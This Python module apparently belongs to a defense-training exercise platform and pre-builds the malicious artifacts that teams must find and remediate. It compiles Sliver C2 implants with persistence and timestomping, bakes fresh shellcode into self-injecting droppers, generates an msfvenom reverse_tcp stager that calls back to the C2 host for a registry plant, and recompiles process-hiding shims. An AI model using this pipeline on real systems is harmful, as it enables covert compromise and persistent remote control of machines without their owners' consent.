"""BUILD step — compile every scoring artifact once, up front, no deploy.

docs/PLAN_build_check_deploy_name_pools.md §5A.3. First of the three explicit
operator steps (BUILD → CHECK → DEPLOY). For each in-scope IOC:

  - **implant IOC** (SliverCheck + implant_spec, non-inject): reuse a valid recent
    `ImplantBuilds` per spec, else generate the per-OS-shared binary **build-only**
    (`deploy_targets=[]`) with the BUILD-picked pooled name (§5B.2 seam).
  - **coupled shim IOC** (`shim_builder.is_recompilable`): recompile with the
    pool-driven `-D` defines (§5B seam) so the baked reference matches the moved
    artifact — via `c2/shim_builder.py`, recorded in the build manifest.
  - **everything else** (script / technique-fixed / inject / already-built shim
    with nothing pooled): `not-applicable` — nothing to pre-build.

Parent `OperatorTask(task_type='build_all')` progress is keyed by `ioc_name`
(`{reason, build_id|artifact, name}`); route in `routes/admin.py`.
"""
from __future__ import annotations

import asyncio
import base64
import json
import logging
from pathlib import Path
from typing import Any

from sqlalchemy import select
from sqlalchemy.orm import Session

from fastapi_backend.c2 import build_manifest, shim_builder
from fastapi_backend.core.config import config
from fastapi_backend.core.deploy_all import _GOOS, _get_ioc_loader, _load_inventory
from fastapi_backend.core.task_tracker import (
    create_task,
    finish_task,
    start_task,
    update_box_progress,
    update_task_metadata,
)
from fastapi_backend.database.db_writer import engine
from fastapi_backend.database.models import ImplantBuilds, OperatorTask
from iocs.base import DefaultCredCheck, SliverCheck

logger = logging.getLogger(__name__)

# Reasons written to the parent progress_json[ioc_name].reason.
REASON_BUILT = "built"
REASON_REUSED = "reused"
REASON_NA = "not-applicable"
REASON_SKIPPED = "skipped"
REASON_FAILED = "failed"


# ── §5B seams (return defaults now; §5B fills in pooled values, additive) ────────

def _resolve_implant_name(ioc: Any) -> str | None:  # noqa: ARG001 — §5B.2 seam
    """Pooled binary filename for an implant IOC, or None for the default.

    §5B.2 extends this to draw a difficulty-tiered name from `naming_pools`.
    """
    return None


def _resolve_coupled_defines(ioc: Any) -> dict[str, str]:
    """Pool-driven `-D` defines for a coupled shim, read from the build manifest.

    For CHECK: returns what was last built (enables stale detection when source drifts).
    For BUILD: the pre-picked cluster_defines in run_build_all take precedence over
    this; this function is the fallback for any shim not covered by a cluster.
    Returns {} when no manifest entry exists → CHECK falls back to committed payload.
    """
    for entry in build_manifest.all_entries().values():
        if entry.get("ioc") == ioc.name and entry.get("defines"):
            return dict(entry["defines"])
    return {}


def spec_wants_payload(ioc_name: str) -> bool:
    """True when this IOC's ``ShimSpec`` bakes a payload via ``SHELLCODE_B64``.

    These shims are useless without one: the committed template is compiled with
    ``-DSHELLCODE_B64='""'`` and the dropper returns immediately when the payload is
    empty (``implant_src/self_inject_linux.c``), injecting nothing while the deploy
    script still reported success. Such a shim must therefore never fall back to the
    committed payload — see ``_build_shim`` and ``build_check._classify``.
    """
    spec = shim_builder.SHIM_SPECS.get(ioc_name)
    return bool(spec and "SHELLCODE_B64" in spec.define_keys)


async def _resolve_shellcode_defines(ioc: Any) -> dict[str, str]:
    """Generate a fresh Sliver payload for a payload-baking shim.

    Returns ``{"SHELLCODE_B64": <base64>}``, or ``{}`` for shims that do not bake a
    payload. Raises ``RuntimeError`` when the payload cannot be produced — the caller
    turns that into ``REASON_FAILED`` rather than shipping an empty dropper
    (docs/PLAN_self_inject_shellcode_baking.md §6 D2).

    The payload is generated fresh on every BUILD so its mTLS identity is registered
    with the *current* Sliver server; a stale baked payload is dead on arrival once
    ``clean_stale_implants.sh`` prunes the server-side implant_config.
    """
    if not spec_wants_payload(ioc.name):
        return {}

    goos = _GOOS.get(ioc.os, ioc.os)
    host = config.C2_IP or config.SLIVER_HOST
    c2_url = f"mtls://{host}:{config.MTLS_LISTENER_PORT}"

    from fastapi_backend.routes.c2 import _generate_inject_shellcode  # cycle-break

    shellcode = await _generate_inject_shellcode(c2_url, goos=goos)
    if not shellcode:
        raise RuntimeError(f"{ioc.name}: Sliver returned an empty payload")
    return {"SHELLCODE_B64": base64.b64encode(shellcode).decode("ascii")}


# Hard ceiling on the base64 stager. The value travels inline as C3R_SHELLCODE_B64,
# and anything on a cmd.exe command line under smbexec truncates at 8191 chars
# (tests/ioc_vm_helpers.py). The measured msfvenom stager is 680 chars; 4096 leaves
# ~6x headroom while still failing loud long before the real cliff.
STAGER_B64_MAX_CHARS = 4096

# Sliver's own `generate stager` emits this payload for a TCP stage-listener.
_STAGER_PAYLOAD = "windows/x64/custom/reverse_tcp"


def resolve_stager_b64() -> str:
    """Generate a fresh Windows stager and return it base64-encoded.

    Used by ``windows_shellcode_registry``: the registry value holds a real, small
    (~509 byte) stager that dials ``C2_IP:STAGE_LISTENER_PORT`` to pull its second
    stage from the Sliver stage-listener. Storing the *full* beacon was rejected —
    it is 17.8 MB, ~24 MB base64, which no registry hive should carry and which the
    check does not need (docs/PLAN_shellcode_registry_stager.md D1).

    Raises ``RuntimeError`` when the stager cannot be produced. The caller turns that
    into ``REASON_FAILED``; it must never fall back to an empty or synthetic value,
    because a deploy that plants nothing scores as *already remediated* the instant it
    lands — the exact defect this replaced.
    """
    import shutil  # cycle-break
    import subprocess  # cycle-break
    import tempfile  # cycle-break

    if shutil.which("msfvenom") is None:
        raise RuntimeError(
            "msfvenom not found — required to generate the windows_shellcode_registry "
            "stager. Install metasploit-framework on the Sliver host."
        )

    host = config.C2_IP or config.SLIVER_HOST
    with tempfile.TemporaryDirectory() as td:
        out = Path(td) / "stager.bin"
        try:
            subprocess.run(
                [
                    "msfvenom", "-p", _STAGER_PAYLOAD,
                    f"LHOST={host}", f"LPORT={config.STAGE_LISTENER_PORT}",
                    "-f", "raw", "-o", str(out),
                ],
                check=True, capture_output=True, timeout=180,
            )
        except subprocess.TimeoutExpired as exc:
            raise RuntimeError("msfvenom stager generation timed out (>180s)") from exc
        except subprocess.CalledProcessError as exc:
            stderr = (exc.stderr or b"").decode("utf-8", "replace")[:400]
            raise RuntimeError(f"msfvenom stager generation failed: {stderr}") from exc

        if not out.exists() or out.stat().st_size == 0:
            raise RuntimeError("msfvenom produced an empty stager")
        b64 = base64.b64encode(out.read_bytes()).decode("ascii")

    if len(b64) > STAGER_B64_MAX_CHARS:
        raise RuntimeError(
            f"stager base64 is {len(b64)} chars, over the {STAGER_B64_MAX_CHARS} "
            "ceiling — it would truncate on the deploy command line"
        )
    return b64


def _build_cluster_defines() -> dict[str, dict[str, str]]:
    """Pre-pick per-cluster comm names for coupled shims (networkd cluster).

    Returns {ioc_name: {define_key: value}} for cluster members that have a pool entry.
    Called once per build_all run before the concurrent gather so all cluster members
    share the same comm without a race.
    """
    from fastapi_backend.core.naming_pools import naming_pool_manager  # cycle-break
    out: dict[str, dict[str, str]] = {}
    # networkd cluster (Linux): linux_kill_shim BEACON_COMM ↔ linux_hide_library HIDDEN_COMM
    linux_comm = naming_pool_manager.pick_unused_name("comm", "linux", difficulty=3)
    if linux_comm:
        out["linux_kill_shim"] = {"BEACON_COMM": linux_comm}
        out["linux_hide_library"] = {"HIDDEN_COMM": linux_comm}
    return out


# ── Implant reuse ────────────────────────────────────────────────────────────

def _find_reusable_build(ioc: Any) -> ImplantBuilds | None:
    """A recent on-disk `ImplantBuilds` matching this IOC's spec, or None.

    Matches os/arch/format/type/persistence; requires the binary dir to still
    exist on disk. Most-recent first.
    """
    spec = ioc.implant_spec
    goos = _GOOS.get(ioc.os, ioc.os)
    itype = "beacon" if spec.is_beacon else "session"
    with Session(engine) as db:
        rows = db.execute(
            select(ImplantBuilds)
            .where(
                ImplantBuilds.os == goos,
                ImplantBuilds.arch == spec.arch,
                ImplantBuilds.format == spec.format,
                ImplantBuilds.implant_type == itype,
            )
            .order_by(ImplantBuilds.created_at.desc())
        ).scalars().all()
    for row in rows:
        if (row.persistence_mechanism or None) != (spec.persistence_name or None):
            continue
        if (Path(config.IMPLANT_STORE_DIR) / row.id).exists():
            return row
    return None


async def _build_implant(ioc: Any, actor: str, parent_task_id: int, *, force: bool) -> None:
    from fastapi_backend.routes.c2 import (  # cycle-break
        ImplantGenerateRequest,
        _bg_generate,
    )

    if not force:
        reuse = _find_reusable_build(ioc)
        if reuse is not None:
            _record(parent_task_id, ioc.name, REASON_REUSED,
                    {"build_id": reuse.id, "name": reuse.filename})
            return

    spec = ioc.implant_spec
    goos = _GOOS.get(ioc.os, ioc.os)
    host = config.C2_IP or config.SLIVER_HOST
    c2_url = f"mtls://{host}:{config.MTLS_LISTENER_PORT}"
    timestomp = (
        spec.timestomp if spec.timestomp is not None
        else bool(getattr(ioc, "timestomp", False))
    )
    body = ImplantGenerateRequest(
        os=goos, arch=spec.arch, format=spec.format,
        is_beacon=spec.is_beacon, beacon_interval=spec.beacon_interval,
        c2_url=c2_url,
        deploy_targets=[],                 # BUILD-ONLY — compile, no deploy
        implant_name=_resolve_implant_name(ioc),
        persistence_name=spec.persistence_name,
        apply_immutable=spec.apply_immutable, immutable_scope=spec.immutable_scope,
        auto_register=False,               # registration happens at DEPLOY, not BUILD
        timestomp=timestomp,
    )
    child_id = create_task(
        task_type="generate", operator=actor, team_num=None, target_boxes=[],
        metadata={"ioc_name": ioc.name, "build_all_parent": parent_task_id, "os": goos},
    )
    try:
        await _bg_generate(child_id, body, actor)
    except Exception:
        logger.exception("build_all: _bg_generate raised for %s", ioc.name)
        _record(parent_task_id, ioc.name, REASON_FAILED, {"error": "compile dispatch error"})
        return

    with Session(engine) as db:
        child = db.get(OperatorTask, child_id)
        meta = json.loads(child.metadata_json or "{}") if child else {}
    build_id = meta.get("build_id")
    if build_id:
        _record(parent_task_id, ioc.name, REASON_BUILT,
                {"build_id": build_id, "name": meta.get("filename")})
    else:
        _record(parent_task_id, ioc.name, REASON_FAILED, {"error": "no build_id produced"})


async def _build_shim(
    ioc: Any, parent_task_id: int, *, force: bool,
    cluster_defines: dict[str, dict[str, str]] | None = None,
) -> None:
    # Cluster-pre-picked defines take precedence; fall back to manifest-read defines.
    defines = dict((cluster_defines or {}).get(ioc.name) or _resolve_coupled_defines(ioc))

    # Payload-baking shims (self-inject droppers) must get a FRESH payload every
    # build. Generate it before the no-defines check below so the guard can never be
    # short-circuited by a shim that happens to have no other pooled define.
    wants_payload = spec_wants_payload(ioc.name)
    if wants_payload:
        if config.DEV_MODE:
            # No Sliver in DEV_MODE, and nothing deploys for real either. Mirror the
            # implant branch's DEV_MODE handling rather than raising a false alarm.
            # Still not a pass: CHECK reports these MISSING (no payload recorded), so
            # a deploy remains gated.
            _record(parent_task_id, ioc.name, REASON_SKIPPED,
                    {"note": "DEV_MODE: no Sliver — payload not baked"})
            return
        # A manifest-read SHELLCODE_B64 is only a digest (§6 D5), never a usable
        # payload — drop it so a stale digest can't masquerade as a real one.
        defines.pop("SHELLCODE_B64", None)
        try:
            defines.update(await _resolve_shellcode_defines(ioc))
        except Exception as exc:
            # GUARD (§7.3): never fall through to the committed empty template.
            logger.warning("build_all: payload generation failed for %s: %s", ioc.name, exc)
            _evict_shim_artifact(ioc)
            _record(parent_task_id, ioc.name, REASON_FAILED,
                    {"error": f"no payload baked — refusing to ship empty dropper: {exc}"})
            return

    if not defines:
        if wants_payload:
            # Unreachable in practice (the block above either populated
            # SHELLCODE_B64 or returned), but fail loud rather than silently
            # shipping the empty committed template if it ever is reached.
            _evict_shim_artifact(ioc)
            _record(parent_task_id, ioc.name, REASON_FAILED,
                    {"error": "no payload baked — refusing to ship empty dropper"})
            return
        # Nothing pooled for this coupled shim yet → committed payload is correct.
        _record(parent_task_id, ioc.name, REASON_NA, {"note": "no pooled coupling"})
        return
    try:
        path = await asyncio.to_thread(shim_builder.build_shim, ioc.name, defines, force=force)
        _record(parent_task_id, ioc.name, REASON_BUILT,
                {"artifact": str(path),
                 # Record the manifest view so a multi-MB payload never lands in
                 # the task's progress_json either (§6 D5).
                 "defines": shim_builder.manifest_defines(defines)})
    except shim_builder.ShimBuilderError as exc:
        logger.warning("build_all: shim recompile failed for %s: %s", ioc.name, exc)
        _evict_shim_artifact(ioc)
        _record(parent_task_id, ioc.name, REASON_FAILED, {"error": str(exc)})


def _evict_shim_artifact(ioc: Any) -> None:
    """Drop any cached artifact + manifest entry for this shim (§6 D2).

    Without this, a failed build leaves the PREVIOUS build's artifact in the cache;
    a later deploy would happily ship it even though its baked mTLS identity may
    since have been pruned server-side (the dead-on-arrival failure mode).
    Best-effort — eviction must never mask the build failure being reported.
    """
    try:
        prior = _resolve_coupled_defines(ioc)
        if not prior:
            return
        art = shim_builder.expected_artifact(ioc.name, prior)
        if art is None:
            return
        build_manifest.evict(art)
        Path(art).unlink(missing_ok=True)
    except Exception:
        logger.debug("build_all: artifact eviction failed for %s", ioc.name, exc_info=True)


def _record(parent_task_id: int, ioc_name: str, reason: str, details: dict) -> None:
    status = {
        REASON_BUILT: "done", REASON_REUSED: "done", REASON_NA: "done",
        REASON_SKIPPED: "skipped", REASON_FAILED: "failed",
    }[reason]
    update_box_progress(
        parent_task_id, ioc_name, status,
        details=json.dumps({"reason": reason, **details}),
    )


def has_running_build_all() -> bool:
    """True if a build_all parent task is already pending/running."""
    with Session(engine) as db:
        row = db.execute(
            select(OperatorTask.id).where(
                OperatorTask.task_type == "build_all",
                OperatorTask.status.in_(["pending", "running"]),
            ).limit(1)
        ).first()
    return row is not None


async def run_build_all(
    parent_task_id: int,
    actor_username: str,
    *,
    include_implants: bool = True,
    team_nums: list[int] | None = None,
    force: bool = False,
) -> None:
    """Compile every in-scope IOC's artifact build-only; record per-IOC outcome."""
    start_task(parent_task_id)

    loader = _get_ioc_loader()
    iocs_list = [
        ioc for ioc in loader.ioc_definitions.values()
        if not isinstance(ioc.check, DefaultCredCheck)
    ]
    boxes_by_os = _load_inventory(team_nums)
    counters = {"total_iocs": len(iocs_list), "built": 0, "reused": 0,
                "not_applicable": 0, "failed": 0, "skipped": 0}

    # Pre-pick coupled-shim cluster comms before concurrent builds so all cluster
    # members agree on the same value (§5B.4 / §13-C networkd cluster).
    _cluster_defines = _build_cluster_defines()

    async def _one(ioc: Any) -> None:
        name = ioc.name
        try:
            if isinstance(ioc.check, SliverCheck) and not getattr(ioc, "sliver_inject", False):
                if ioc.implant_spec is None:
                    _record(parent_task_id, name, REASON_NA, {"note": "no implant_spec"})
                elif getattr(ioc.implant_spec, "pivot_set_name", None):
                    # Pivot-set members compile as a coordinated 3-implant group on
                    # the DEPLOY path (deploy_all._do_pivot_set), not individually here.
                    _record(parent_task_id, name, REASON_NA, {"note": "pivot set — built at deploy"})
                elif not include_implants:
                    _record(parent_task_id, name, REASON_SKIPPED, {"note": "implants excluded"})
                elif config.DEV_MODE:
                    _record(parent_task_id, name, REASON_SKIPPED, {"note": "DEV_MODE: no Sliver"})
                elif not boxes_by_os.get(ioc.os):
                    _record(parent_task_id, name, REASON_SKIPPED, {"note": "no matching boxes"})
                else:
                    await _build_implant(ioc, actor_username, parent_task_id, force=force)
            elif shim_builder.is_recompilable(name):
                await _build_shim(ioc, parent_task_id, force=force,
                                   cluster_defines=_cluster_defines)
            else:
                _record(parent_task_id, name, REASON_NA, {"note": "nothing to pre-build"})
        except Exception:
            logger.exception("build_all: IOC %s raised", name)
            _record(parent_task_id, name, REASON_FAILED, {"error": "orchestration error"})

    await asyncio.gather(*[_one(ioc) for ioc in iocs_list])

    # Re-derive counters from the parent progress (single source of truth).
    with Session(engine) as db:
        prog = json.loads((db.get(OperatorTask, parent_task_id).progress_json) or "{}")
    for entry in prog.values():
        r = json.loads(entry.get("details") or "{}").get("reason")
        if r == REASON_BUILT:
            counters["built"] += 1
        elif r == REASON_REUSED:
            counters["reused"] += 1
        elif r == REASON_NA:
            counters["not_applicable"] += 1
        elif r == REASON_FAILED:
            counters["failed"] += 1
        elif r == REASON_SKIPPED:
            counters["skipped"] += 1

    update_task_metadata(parent_task_id, counters)
    finish_task(parent_task_id, "failed" if counters["failed"] else "done")
    logger.info(
        "build_all complete (task=%s): built=%d reused=%d n/a=%d skipped=%d failed=%d of %d",
        parent_task_id, counters["built"], counters["reused"], counters["not_applicable"],
        counters["skipped"], counters["failed"], counters["total_iocs"],
    )
